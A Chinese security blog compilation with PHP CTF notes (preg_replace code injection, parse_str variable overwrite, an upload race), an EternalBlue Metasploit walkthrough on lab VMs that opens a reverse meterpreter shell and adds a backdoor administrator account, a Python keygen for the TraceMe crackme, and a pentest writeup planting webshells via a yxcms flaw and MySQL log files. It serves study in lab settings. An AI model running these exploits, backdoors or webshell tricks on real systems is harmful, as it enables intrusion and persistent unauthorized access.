<p>还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。</p>
<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=;phpinfo();
http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=<span class="hljs-variable">$0</span></code></pre></div>

<p>其最后的效果是下面这样的</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;$option=&#x27;</span>;phpinfo();<span class="hljs-string">&#x27;;&#x27;</span>;</code></pre></div>

<h2 id="6-parse-str函数缺陷"><a href="#6-parse-str函数缺陷" class="headerlink" title="6.parse_str函数缺陷"></a>6.parse_str函数缺陷</h2><p><strong>漏洞代码</strong></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;
  <span class="hljs-keyword">global</span> <span class="hljs-variable">$config</span>, <span class="hljs-variable">$db</span>;
  <span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$db</span>)) &#123;
    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> MySQLi(
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbhost&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbuser&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbpass&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]
    );
  &#125;
  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT username FROM users WHERE id = ?&quot;</span>;
  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);
  <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-variable">$id</span>);
  <span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$name</span>);
  <span class="hljs-variable">$stmt</span>-&gt;execute();
  <span class="hljs-variable">$stmt</span>-&gt;fetch();
  <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
&#125;

<span class="hljs-variable">$var</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]);
parse_str(<span class="hljs-variable">$var</span>[<span class="hljs-string">&#x27;query&#x27;</span>]);
<span class="hljs-variable">$currentUser</span> = getUser(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$currentUser</span>).<span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>;</code></pre></div>

<p><strong>漏洞解析</strong></p>
<p><strong>parse_str</strong></p>
<p>先来看看定义：</p>
<blockquote>
<p>parse_str<br><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
<p>定义 ：void parse_str( string $encoded_string [, array &amp;$result ] )</p>
<p>如果 encoded_string 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</p>
</blockquote>
<p>看了定义我们也能很快感受到它的漏洞点就是变量覆盖了。</p>
<p><strong>PHP $_SERVER[‘HTTP_REFERER’]</strong></p>
<p>PHP <code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>，它是获取当前页面的url。需要注意的是，<code>$_SERVER[‘HTTP_REFERER’]</code>完全来源于浏览器。并不是所有的用户代理（浏览器）都会设置这个变量，而且有的还可以手工修改 HTTP_REFERER。因此，$_SERVER[‘HTTP_REFERER’] 是可以伪造的。<br><strong><code>$_SERVER[‘HTTP_REFERER’]</code>对 POST 表单访问也是有效的</strong><br>我们想办法提交类似 config[dbhost]=127.0.0.1 这样类型的数据，这样因此我们可以控制连接的数据库，导致网站出现错误显示。</p>
<p><strong>CTF题目</strong></p>
<p>index.php</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = “hongri”;
<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@parse_str(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>upload.php</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>) &#123;
    <span class="hljs-variable">$savepath</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . sha1(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span>;
    <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$savepath</span>)) &#123;
        <span class="hljs-variable">$oldmask</span> = umask(<span class="hljs-number">0</span>);
        mkdir(<span class="hljs-variable">$savepath</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
        umask(<span class="hljs-variable">$oldmask</span>);
    &#125;
    <span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
        <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span>
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;
        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
        usleep(<span class="hljs-number">100000</span>);
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;
        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
    &#125;
   <span class="hljs-keyword">print</span> &lt;&lt;&lt;EOT
&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;
&lt;div class=&quot;form-group&quot;&gt;
&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;Filename&lt;/label&gt;
&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;
&lt;/div&gt;
&lt;div class=&quot;form-group&quot;&gt;
&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;Content&lt;/label&gt;
&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;
&lt;/div&gt;
&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;
&lt;/form&gt;
EOT;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can not see this page&#x27;</span>;
&#125;</code></pre></div>

<p><strong>第一关</strong></p>
<p>在index.php内有如下;</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@parse_str(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</code></pre></div>

<p>可想而知我们需要用变量覆盖，payload为：</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=s878926199a</code></pre></div>

<p>就会出来一个链接，点击就到了upload页面。如果我们直接访问upload会报错，因为有如下代码：</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>)</code></pre></div>

<p>当我们是通过a标签链接过去的会自动带上refer字段。</p>
<p><strong>第二关</strong></p>
<p>uplaod主要代码：</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
        <span class="hljs-regexp">//</span><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;$savepath&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-string">&#x27;w&#x27;</span>);
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;
        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;
        echo <span class="hljs-variable">$msg</span>;
        usleep(<span class="hljs-number">100000</span>);<span class="hljs-regexp">//</span>延迟
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;
        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
    &#125;</code></pre></div>

<p>可以发现会我们传入的<code>filename</code>会固定的存储在一个固定的位置，而这个位置会在输出中得到。<br>而文件的内容先是flag然后延迟一下马上替换为了 Too slow! 。其实输入的content并没任何作用。<br>思路：我们一直上传同一个文件名，然后使用python或者pb不断的访问这个文件。如果够快就不会把文本内容替换为 Too slow! 这样我们就可以访问到flag</p>
<h1 id="MS17-010漏洞利用演示"><a href="#MS17-010漏洞利用演示" class="headerlink" title="MS17-010漏洞利用演示"></a>MS17-010漏洞利用演示</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 192.168.164.143</p>
<p>win7 IP 192.168.164.135 </p>
<p> 使用ping测试即可</p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：</p>
<div class="hljs"><pre><code class="hljs crmsh">service postgresql <span class="hljs-literal">start</span></code></pre></div>

<p>查看服务状态：</p>
<div class="hljs"><pre><code class="hljs ebnf"><span class="hljs-attribute">service postgresql status</span></code></pre></div>

<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：</p>
<div class="hljs"><pre><code class="hljs csharp">msfdb <span class="hljs-keyword">init</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" srcset="/img/loading.gif" alt="3.png" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130055679.png" srcset="/img/loading.gif" alt="image-20210410130055679" style="zoom:50%;"> </p>
<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><p><strong>(1).首先判断目标主机是否打开445端口</strong></p>
<p>使用nmap+ip 扫描</p>
<img src="https://i.loli.net/2020/11/30/OPuivdSaVlTIMsm.png" srcset="/img/loading.gif" alt="4.png" style="zoom:50%;"> 

<p><strong>(2) .确认目标主机打开445端口后直接使用msf进行攻击</strong></p>
<p>输入<code>msfconsole</code>　启动msf</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
<p>运行</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre></div>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" srcset="/img/loading.gif" alt="5.png" style="zoom:50%;"> 



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130809305.png" srcset="/img/loading.gif" alt="image-20210410130809305"></p>
<p><strong>(3). 配置成功后设置tcp连接</strong></p>
<p>输入命令</p>
<div class="hljs"><pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre></div>



<p><strong>(4).开始运行</strong></p>
<p>输入 exploit/run </p>
<p>成功获取shell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410163228489.png" srcset="/img/loading.gif" alt="image-20210410163228489" style="zoom:50%;">

<p>查看ip地址验证是否为目标主机。</p>
<p><strong>(5)设立后门，在目标主机中创建一个用户</strong></p>
<p>创建一个用户</p>
<div class="hljs"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre></div>

<p>Username:test </p>
<p>password:abc123.com</p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<div class="hljs"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" srcset="/img/loading.gif" alt="10.png"></p>
<p>目标主机上用户创建成功</p>
<img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" srcset="/img/loading.gif" alt="11.png" style="zoom: 50%;">

<p>  <strong>实验结束</strong></p>
<h1 id="TraceMe-exe注册机"><a href="#TraceMe-exe注册机" class="headerlink" title="TraceMe.exe注册机"></a>TraceMe.exe注册机</h1><p>打开程序，随便试一试</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514154316260.png" srcset="/img/loading.gif" alt="image-20210514154316260"></p>
<p>通过OD打开该程序，它会自动定位到模块入口点0x004013A0位置，也就是验证函数的内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155349139.png" srcset="/img/loading.gif" alt="image-20210514155349139" style="zoom:67%;">

<p>数据表中405030的数据，程序中需要用到</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155944624.png" srcset="/img/loading.gif" alt="image-20210514155944624"></p>
<p>汇编代码的如下</p>
<div class="hljs"><pre><code class="hljs vb"><span class="hljs-number">00401340</span>  /$  <span class="hljs-number">55</span>            push ebp
<span class="hljs-number">00401341</span>  |.  <span class="hljs-number">8</span>B6C24 <span class="hljs-number">0</span>C     mov ebp,dword ptr ss:[esp+<span class="hljs-number">0</span>xC]          ;ebp = 用户名
<span class="hljs-number">00401345</span>  |.  <span class="hljs-number">56</span>            push esi                                 ;  TraceMe.<span class="hljs-number">0040504</span>F
<span class="hljs-number">00401346</span>  |.  <span class="hljs-number">57</span>            push edi
<span class="hljs-number">00401347</span>  |.  <span class="hljs-number">8</span>B7C24 <span class="hljs-number">18</span>     mov edi,dword ptr ss:[esp+<span class="hljs-number">0</span>x18]         ;edi = 用户名的长度
<span class="hljs-number">0040134</span>B  |.  B9 <span class="hljs-number">03000000</span>   mov ecx,<span class="hljs-number">0</span>x3 ;ecx = 从用户名的第四个字符开始计算
<span class="hljs-number">00401350</span>  |.  <span class="hljs-number">33</span>F6          <span class="hljs-built_in">xor</span> esi,esi     ;esi = <span class="hljs-number">0</span> = 计算出的注册码                             ;  TraceMe.<span class="hljs-number">0040504</span>F
<span class="hljs-number">00401352</span>  |.  <span class="hljs-number">33</span>C0          <span class="hljs-built_in">xor</span> eax,eax     ;eax = <span class="hljs-number">0</span>,用于计数，读取数据表的第eax个字节
<span class="hljs-number">00401354</span>  |.  <span class="hljs-number">3</span>BF9          cmp edi,ecx     ;<span class="hljs-keyword">if</span>(edi &gt; ecx)
00401356  |.  7E 21         jle short   ;&#123; TraceMe.00401379
<span class="hljs-number">00401358</span>  |.  <span class="hljs-number">53</span>            push ebx
<span class="hljs-number">00401359</span>  |&gt;  <span class="hljs-number">83</span>F8 <span class="hljs-number">07</span>       /cmp eax,<span class="hljs-number">0</span>x7    ; <span class="hljs-keyword">if</span>(eax &gt; <span class="hljs-number">7</span>)
<span class="hljs-number">0040135</span>C  |.  <span class="hljs-number">7</span>E <span class="hljs-number">02</span>         |jle <span class="hljs-type">short</span> TraceMe.<span class="hljs-number">00401360</span>
0040135E  |.  33C0          |xor eax,eax    ;&#123;eax = 0;&#125;
<span class="hljs-number">00401360</span>  |&gt;  <span class="hljs-number">33</span>D2          |<span class="hljs-built_in">xor</span> edx,edx    ;edx = <span class="hljs-number">0</span>;
<span class="hljs-number">00401362</span>  |.  <span class="hljs-number">33</span>DB          |<span class="hljs-built_in">xor</span> ebx,ebx    ;ebx = <span class="hljs-number">0</span>
<span class="hljs-number">00401364</span>  |.  <span class="hljs-number">8</span>A1429        |mov dl,<span class="hljs-type">byte</span> ptr ds:[ecx+ebp]   ; dl = ebp + ecx = 从用户名的第四个字符开始计算
<span class="hljs-number">00401367</span>  |.  <span class="hljs-number">8</span>A98 <span class="hljs-number">30504000</span> |mov bl,<span class="hljs-type">byte</span> ptr ds:[eax+<span class="hljs-number">0</span>x405030]  ;bl = 数据表第eax个字符，数据表的内存地址为<span class="hljs-number">0</span>x00405030处，查找其数值为<span class="hljs-number">0</span>C <span class="hljs-number">0</span>A <span class="hljs-number">13</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>C <span class="hljs-number">0</span>B <span class="hljs-number">0</span>A <span class="hljs-number">08</span>(根据判断语句<span class="hljs-number">0</span>x00401359可知，只有<span class="hljs-number">8</span>个数据)
<span class="hljs-number">0040136</span>D  |.  <span class="hljs-number">0</span>FAFD3        |imul edx,ebx   ;edx = edx * ebx
<span class="hljs-number">00401370</span>  |.  <span class="hljs-number">03</span>F2          |add esi,edx    ;esi = esi + edx
<span class="hljs-number">00401372</span>  |.  <span class="hljs-number">41</span>            |inc ecx    ;ecx++
<span class="hljs-number">00401373</span>  |.  <span class="hljs-number">40</span>            |inc eax    ;eax++;
<span class="hljs-number">00401374</span>  |.  <span class="hljs-number">3</span>BCF          |cmp ecx,edi    ;<span class="hljs-keyword">if</span>(ecx&lt;edi)   如果未取完用户名字符则继续
00401376  |.^ 7C E1         \jl short   ;&#123;goto 0x00401359&#125; TraceMe.00401359
<span class="hljs-number">00401378</span>  |.  <span class="hljs-number">5</span>B            pop ebx   ;计算结束                               ;  <span class="hljs-number">0012</span>FAE8
<span class="hljs-number">00401379</span>  |&gt;  <span class="hljs-number">56</span>            push esi                                 ; /&lt;%ld&gt; = <span class="hljs-number">40504</span>F (<span class="hljs-number">4214863</span>.)</code></pre></div>



<p>使用python写出注册机</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crake_traceme</span>():</span>
	code, <span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>
	username = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入用户名&quot;</span>)
	num = [<span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x08</span>]
	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(username)):
    	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> &gt; <span class="hljs-number">7</span>:
        	<span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>
    	code += <span class="hljs-built_in">ord</span>(username[i]) * num[<span class="hljs-built_in">len</span>]
    	<span class="hljs-built_in">len</span> += <span class="hljs-number">1</span>
	print(<span class="hljs-string">&quot;The code is:\n&quot;</span> + <span class="hljs-built_in">str</span>(code))
crake_traceme()</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210418222548281.png" srcset="/img/loading.gif" alt="image-20210418222548281">)<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155437404.png" srcset="/img/loading.gif" alt="image-20210514155437404"></p>
<h1 id="一次域渗透测试攻击"><a href="#一次域渗透测试攻击" class="headerlink" title="一次域渗透测试攻击"></a>一次域渗透测试攻击</h1><p>第一次做渗透测试，有的地方做的不是很好</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用的靶机是红日安全提供的，地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<p>搭建过程中有一点需要注意</p>
<p>Web服务主机win7有两块网卡，需要在设置中再添加一块网卡</p>
<p>网卡一连接到<code>VMnet2</code>中，作为内网环境</p>
<p>网卡二连接到<code>VMnet1</code>中，作为公网环境，并攻击机连到<code>VMnet1</code>中,确保其可以访问网站主页</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" srcset="/img/loading.gif" alt="image-20210511130030032" style="zoom:50%;">

<p>剩下的两台域控主机直接连接到<code>VMnet2</code>中即可，可以与web服务器通信</p>
<p>修改window10物理机的VMnet1网卡</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" srcset="/img/loading.gif" alt="image-20210511214717086" style="zoom:67%;">

<p>这样物理机和kali都可以访问到靶机网站</p>
<p><strong>实验拓扑图:</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" srcset="/img/loading.gif" alt="image-20210511124808522" style="zoom: 50%;">

<ul>
<li>web服务器(win7): 公网IP:192.168.74.128   内网IP: 192.168.52.143 主机名:stu1</li>
<li>域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh</li>
<li>域控(Windows Server 2008)：192.168.52.138 主机名：owa</li>
</ul>
<p>web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="网站探测"><a href="#网站探测" class="headerlink" title="网站探测"></a>网站探测</h3><p>首先访问网站主页: <a target="_blank" rel="noopener" href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" srcset="/img/loading.gif" alt="image-20210511130446365" style="zoom: 50%;">

<p>先扫描一下目录</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" srcset="/img/loading.gif" alt="image-20210511153857974" style="zoom:50%;">

<p>可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如<code>/public</code>,可以看到该目录下的很多内容，但是没有想要内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" srcset="/img/loading.gif" alt="image-20210511154129595" style="zoom: 33%;">



<h3 id="网站漏洞利用getshell"><a href="#网站漏洞利用getshell" class="headerlink" title="网站漏洞利用getshell"></a>网站漏洞利用getshell</h3><ul>
<li><p>经过探测网站的后台登录页面是<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p>
<p>经过爆破很容易试出密码为<code>123456</code></p>
<p>成功登录后台</p>
</li>
</ul>
<ul>
<li><p>尝试搜索网站已发现的漏洞</p>
<p>这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162886.html">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
<p>可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞</p>
<p>访问<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>，这里可以写入php文件</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" srcset="/img/loading.gif" alt="image-20210511155855512" style="zoom:50%;">



</li>
</ul>
<p>写入一句话木马</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155949294.png" srcset="/img/loading.gif" alt="image-20210511155949294"></p>
<p>写入成功后，访问<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>可以看到已经成功写入一句话木马，之后就是用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" srcset="/img/loading.gif" alt="image-20210511160216194" style="zoom: 33%;">

<p>成功获取shell，并且是system权限，这是由于该网站管理员直接使用<code>administrator</code>登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" srcset="/img/loading.gif" alt="image-20210511160418538" style="zoom:50%;">



<h3 id="使用phpMyAdmin-Getshell"><a href="#使用phpMyAdmin-Getshell" class="headerlink" title="使用phpMyAdmin Getshell"></a>使用phpMyAdmin Getshell</h3><p>扫描<code>http://192.168.74.129/</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" srcset="/img/loading.gif" alt="image-20210511160728113" style="zoom:50%;">

<p>直接使用工具爆破，很容易得到，用户名和密码都为<code>root</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" srcset="/img/loading.gif" alt="image-20210511132208919" style="zoom:50%;">

<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code>secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" srcset="/img/loading.gif" alt="image-20210511161606685" style="zoom:50%;">

<p>但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysql日志木马</a></p>
<p>执行下列命令</p>
<div class="hljs"><pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #开启日志
set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #设置指定文件为网站日志存放文件
